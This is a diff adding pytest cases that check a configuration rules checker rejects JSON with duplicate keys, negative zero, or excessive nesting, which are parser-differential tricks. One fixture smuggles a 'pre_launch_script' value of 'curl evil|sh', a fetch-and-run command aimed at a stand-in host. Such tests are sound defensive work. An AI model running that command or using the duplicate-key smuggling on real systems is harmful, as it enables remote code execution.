@@ -232,6 +232,55 @@ def test_out_of_range_integer_refuses_normalization():
     assert rules.instance_label_sha256(ok) is not None
 
 
+def prepend_member(prefix, member):
+    """A fixture's raw bytes with `member,` inserted before its first member."""
+    r = raw(prefix)
+    assert r.startswith("{")
+    return "{" + member + "," + r[1:]
+
+
+def test_duplicate_key_on_a_gateway_holds():
+    # json.loads keeps the last value, so an earlier allowed_envs would never be compared.
+    dup = prepend_member("1787a4af87ea", '"allowed_envs":["FOO"]')
+    v = rules.evaluate(dup, "gateway", [raw("1787a4af87ea")])
+    assert (v.passed, v.failures) == (False, ["PARSE"])
+
+
+def test_duplicate_key_on_a_model_holds_and_does_not_normalize():
+    dup = prepend_member("e3902667a262", '"pre_launch_script":"curl evil|sh"')
+    assert rules.instance_label_sha256(dup) is None
+    v = rules.evaluate(dup, "model", [raw("e3902667a262")])
+    assert (v.passed, v.failures) == (False, ["PARSE"])
+
+
+def test_nested_duplicate_key_does_not_normalize():
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":{"y":1}')) is not None
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":{"y":1,"y":1}')) is None
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":[{"y":1,"y":2}]')) is None
+
+
+def test_negative_zero_refuses_normalization():
+    # serde_json parses `-0` as the float -0.0, which the Rust side refuses.
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":0')) is not None
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":-0')) is None
+    assert rules.instance_label_sha256(prepend_member("e3902667a262", '"x":[1,{"y":-0}]')) is None
+    v = rules.evaluate(prepend_member("e3902667a262", '"x":-0'), "model", [raw("e3902667a262")])
+    assert (v.passed, v.failures) == (False, ["PARSE"])
+
+
+def test_nesting_past_serde_json_limit_refuses_normalization():
+    # serde_json 1.0.154 starts remaining_depth at 128 and fails when it reaches
+    # 0, so 127 nested containers parse and 128 do not. The outer object is one.
+    def nested(n):
+        return prepend_member("e3902667a262", '"x":' + "[" * (n - 1) + "]" * (n - 1))
+    assert rules.instance_label_sha256(nested(127)) is not None
+    assert rules.instance_label_sha256(nested(128)) is None
+    assert rules.instance_label_sha256(nested(200)) is None
+    assert rules.instance_label_sha256(nested(100_000)) is None
+    v = rules.evaluate(nested(128), "model", [raw("e3902667a262")])
+    assert (v.passed, v.failures) == (False, ["PARSE"])
+
+
 def test_canonical_sorts_recursively_and_keeps_utf8():
     assert rules.canonical({"b": [{"d": 1, "c": True}], "a": "é", "z": None}) == \
         '{"a":"é","b":[{"c":true,"d":1}],"z":null}'
